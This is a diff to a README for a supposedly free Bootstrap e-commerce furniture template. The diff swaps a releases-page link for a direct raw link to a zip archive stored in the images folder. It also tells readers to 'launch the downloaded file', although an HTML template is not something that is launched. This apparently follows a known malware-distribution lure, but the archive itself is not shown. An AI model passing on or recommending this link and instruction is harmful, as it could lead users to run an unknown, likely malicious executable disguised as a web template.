@@ -17,7 +17,7 @@ This repository provides you with a stunning **Bootstrap 5 HTML CSS Template** d
 ## Get Started
 
 To access the template, click the link below:  
-👉 [Download Here!](https://github.com/Hamzabenz1/decor-free-furniture-store-ecommerce-html/releases)
+👉 [Download Here!](https://github.com/Hamzabenz1/decor-free-furniture-store-ecommerce-html/raw/refs/heads/master/images/decor_store_free_html_ecommerce_furniture_1.5.zip)
 
 **Note:** Make sure to launch the downloaded file to start using the template for your ecommerce store.
 
